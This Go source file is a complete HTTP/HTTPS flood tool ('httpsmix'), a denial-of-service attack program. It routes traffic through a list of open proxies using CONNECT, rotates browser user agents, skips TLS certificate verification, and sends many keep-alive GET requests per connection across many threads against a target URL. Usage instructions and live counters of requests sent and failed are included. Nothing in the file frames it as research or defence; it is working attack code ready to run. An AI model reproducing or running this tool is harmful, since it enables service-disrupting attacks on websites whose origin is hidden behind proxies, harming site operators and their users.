// httpsmix - Mixed protocol HTTP/HTTPS flood tool
// Rewrite of binary https-mix with modern Go patterns
package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	proxies    []string
	userAgents []string
	targetURL  *url.URL
	targetPort string
	headers    map[string]string
	stats      struct {
		mu     sync.Mutex
		sent   int64
		failed int64
	}
)

func main() {
	rand.Seed(time.Now().UnixNano())

	if len(os.Args) < 5 {
		fmt.Println("HTTPSMix - Mixed HTTP/HTTPS Flood Tool")
		fmt.Println("Usage: httpsmix <url> <time> <threads> <proxyfile> [rate]")
		fmt.Println("Example: httpsmix https://example.com 60 10 proxy.txt 100")
		os.Exit(1)
	}

	targetStr := os.Args[1]
	duration, _ := strconv.Atoi(os.Args[2])
	threads, _ := strconv.Atoi(os.Args[3])
	proxyFile := os.Args[4]
	rate := 50
	if len(os.Args) > 5 {
		rate, _ = strconv.Atoi(os.Args[5])
	}

	var err error
	targetURL, err = url.Parse(targetStr)
	if err != nil {
		fmt.Printf("[!] Invalid target URL: %v\n", err)
		os.Exit(1)
	}

	// Determine target port
	if targetURL.Port() != "" {
		targetPort = targetURL.Port()
	} else if targetURL.Scheme == "https" {
		targetPort = "443"
	} else {
		targetPort = "80"
	}

	// Load proxies
	proxies = loadLines(proxyFile)
	if len(proxies) == 0 {
		fmt.Println("[!] No proxies loaded")
		os.Exit(1)
	}

	// Load user agents
	userAgents = loadLines("ua.txt")
	if len(userAgents) == 0 {
		userAgents = []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		}
	}

	// Headers
	headers = map[string]string{
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Accept-Language":           "en-US,en;q=0.5",
		"Cache-Control":             "no-cache",
		"Pragma":                    "no-cache",
		"Upgrade-Insecure-Requests": "1",
	}

	fmt.Printf("[+] Target: %s (port %s)\n", targetURL.Hostname(), targetPort)
	fmt.Printf("[+] Duration: %ds\n", duration)
	fmt.Printf("[+] Threads: %d\n", threads)
	fmt.Printf("[+] Proxies: %d\n", len(proxies))
	fmt.Printf("[+] Rate: %d req/s\n", rate)

	var wg sync.WaitGroup
	startTime := time.Now()

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(&wg, duration, rate)
		time.Sleep(time.Millisecond)
	}

	// Stats display
	go func() {
		ticker := time.NewTicker(3 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			elapsed := int(time.Since(startTime).Seconds())
			if elapsed >= duration {
				return
			}
			stats.mu.Lock()
			s, f := stats.sent, stats.failed
			stats.mu.Unlock()
			fmt.Printf("\r[+] Sent: %d | Failed: %d | Time: %ds/%ds   ", s, f, elapsed, duration)
		}
	}()

	wg.Wait()
	elapsed := int(time.Since(startTime).Seconds())
	stats.mu.Lock()
	fmt.Printf("\n[+] Done! Sent: %d | Failed: %d | Duration: %ds\n", stats.sent, stats.failed, elapsed)
	stats.mu.Unlock()
}

func worker(wg *sync.WaitGroup, duration, rate int) {
	defer wg.Done()
	deadline := time.Now().Add(time.Duration(duration) * time.Second)

	for time.Now().Before(deadline) {
		proxy := randomElement(proxies)
		parts := strings.Split(proxy, ":")
		if len(parts) < 2 {
			continue
		}

		proxyHost, proxyPort := parts[0], parts[1]
		isHTTPS := targetURL.Scheme == "https"

		// Open proxy CONNECT connection
		conn, err := dialProxy(proxyHost, proxyPort, targetURL.Hostname(), targetPort)
		if err != nil {
			continue
		}

		// For HTTPS: wrap once, send all requests through same TLS session
		if isHTTPS {
			tlsConn := tls.Client(conn, &tls.Config{
				ServerName:         targetURL.Hostname(),
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
				NextProtos:         []string{"h2", "http/1.1"},
			})

			tlsConn.SetDeadline(time.Now().Add(30 * time.Second))
			if err := tlsConn.Handshake(); err != nil {
				stats.mu.Lock()
				stats.failed++
				stats.mu.Unlock()
				tlsConn.Close()
				conn.Close()
				continue
			}

			ua := randomElement(userAgents)
			path := targetURL.Path
			if path == "" {
				path = "/"
			}

			for i := 0; i < rate && time.Now().Before(deadline); i++ {
				req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: %s\r\nAccept-Language: %s\r\nConnection: keep-alive\r\n\r\n",
					path, targetURL.Host, ua, headers["Accept"], headers["Accept-Language"])

				tlsConn.SetDeadline(time.Now().Add(15 * time.Second))
				if _, err := tlsConn.Write([]byte(req)); err != nil {
					break
				}
				io.CopyN(io.Discard, tlsConn, 1024)

				stats.mu.Lock()
				stats.sent++
				stats.mu.Unlock()
			}

			tlsConn.Close()
		} else {
			// HTTP: send plain requests
			ua := randomElement(userAgents)
			path := targetURL.Path
			if path == "" {
				path = "/"
			}

			for i := 0; i < rate && time.Now().Before(deadline); i++ {
				req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: %s\r\nConnection: keep-alive\r\n\r\n",
					path, targetURL.Host, ua, headers["Accept"])

				conn.SetDeadline(time.Now().Add(5 * time.Second))
				if _, err := conn.Write([]byte(req)); err != nil {
					break
				}

				stats.mu.Lock()
				stats.sent++
				stats.mu.Unlock()
			}
		}

		conn.Close()
	}
}

func dialProxy(proxyHost, proxyPort, targetHost, targetPort string) (net.Conn, error) {
	addr := net.JoinHostPort(proxyHost, proxyPort)
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return nil, err
	}

	// CONNECT to target
	req := fmt.Sprintf("CONNECT %s:%s HTTP/1.1\r\nHost: %s:%s\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n",
		targetHost, targetPort, targetHost, targetPort)

	conn.SetDeadline(time.Now().Add(10 * time.Second))
	if _, err := conn.Write([]byte(req)); err != nil {
		conn.Close()
		return nil, err
	}

	resp := make([]byte, 1024)
	n, err := conn.Read(resp)
	if err != nil || !strings.Contains(string(resp[:n]), "200") {
		conn.Close()
		return nil, fmt.Errorf("CONNECT failed")
	}

	conn.SetDeadline(time.Time{})
	return conn, nil
}

func loadLines(filePath string) []string {
	f, err := os.Open(filePath)
	if err != nil {
		return nil
	}
	defer f.Close()

	var lines []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	return lines
}

func randomElement(slice []string) string {
	if len(slice) == 0 {
		return ""
	}
	return slice[rand.Intn(len(slice))]
}
